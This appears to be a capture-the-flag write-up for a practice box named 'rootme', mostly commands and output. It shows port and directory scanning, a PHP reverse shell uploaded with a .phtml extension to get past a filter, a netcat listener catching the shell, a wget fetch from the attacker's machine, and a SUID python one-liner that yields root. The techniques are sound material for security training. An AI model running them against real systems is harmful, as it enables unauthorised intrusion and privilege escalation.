# recon
- pymap
```
@@@@@@@   @@@ @@@  @@@@@@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@ @@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@! !@@  @@! @@! @@!  @@!  @@@  @@!  @@@  
!@!  @!@  !@! @!!  !@! !@! !@!  !@!  @!@  !@!  @!@  
@!@@!@!    !@!@!   @!! !!@ @!@  @!@!@!@!  @!@@!@!   
!!@!!!      @!!!   !@!   ! !@!  !!!@!!!!  !!@!!!    
!!:         !!:    !!:     !!:  !!:  !!!  !!:       
:!:         :!:    :!:     :!:  :!:  !:!  :!:       
 ::          ::    :::     ::   ::   :::   ::       
 :           :      :      :     :   : :   :        
Author: kuroHat
Github: https://github.com/gu2rks

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	CVE-2008-3844	9.3	https://vulners.com/cve/CVE-2008-3844

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-server-header: Apache/2.4.29 (Ubuntu)

```
to check if the web is run using php you can try to request for `/index.php` if it return the main page then the web page is runing using php. so what do it tell us? Also, /`index.html` gives us **404** then

Yes it tells us that when we gonna run gobuster (web brutforcing) we should looks for extra extention which is `php`

- gobuster
```console
kali@kali:~$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 54 -x php
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

```console
kali@kali:~/THM/rootme$ ls
kali@kali:~/THM/rootme$ touch test.txt
kali@kali:~/THM/rootme$ nano test.php
kali@kali:~/THM/rootme$ cat test.php 
<?php
echo "Hello world!";
?> 
kali@kali:~/THM/rootme$ mv test.php test2.txt
kali@kali:~/THM/rootme$ mv test2.txt test.phtml
kali@kali:~/THM/rootme$ mv php-reverse-shell.php kurohat.phtml
```

```console
kali@kali:~$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.71.120] 39154
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:12:27 up 24 min,  0 users,  load average: 0.00, 0.04, 0.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls -la /home/
total 16
drwxr-xr-x  4 root   root   4096 Aug  4 17:33 .
drwxr-xr-x 24 root   root   4096 Aug  4 14:54 ..
drwxr-xr-x  4 rootme rootme 4096 Aug  4 17:07 rootme
drwxr-xr-x  3 test   test   4096 Aug  4 17:54 test
```

```
www-data@rootme:/home/rootme$ find / -name user.txt 2> /dev/null
find / -name user.txt 2> /dev/null
/var/www/user.txt
www-data@rootme:/home/rootme$ cat /var/www/user.txt
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

`wget http://<kali ip>:8080/suid3num.py`

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/python
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/python -~> https://gtfobins.github.io/gtfobins/python/#suid
------------------------------


[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
------------------------------


[-] Note
------------------------------
If you see any FP in the output, please report it to make the script better! :)
------------------------------

www-data@rootme:/var/www$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
```